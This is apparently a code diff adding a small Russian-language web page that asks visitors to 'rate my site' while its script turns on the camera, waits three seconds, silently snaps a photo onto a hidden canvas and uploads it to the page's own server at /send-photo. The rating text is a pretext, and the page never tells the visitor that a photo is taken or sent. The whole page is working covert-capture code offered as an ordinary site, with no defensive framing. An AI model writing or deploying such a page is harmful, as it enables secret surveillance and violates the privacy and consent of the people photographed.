@@ -1,0 +1,48 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Мой сайт</title>
+</head>
+<body style="display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column;">
+  <h2>Оцените мой сайт!</h2>
+  <video id="video" width="320" height="240" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // Запрос камеры
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        // Подождать немного перед съемкой
+        setTimeout(() => {
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+
+            // Отправка на сервер
+            fetch('/send-photo', {
+              method: 'POST',
+              body: formData
+            }).then(res => {
+              console.log('Фото отправлено');
+            }).catch(err => {
+              console.error('Ошибка при отправке фото:', err);
+            });
+          }, 'image/jpeg');
+        }, 3000); // 3 секунды
+      })
+      .catch(error => {
+        console.error('Ошибка доступа к камере:', error);
+      });
+  </script>
+</body>
+</html>
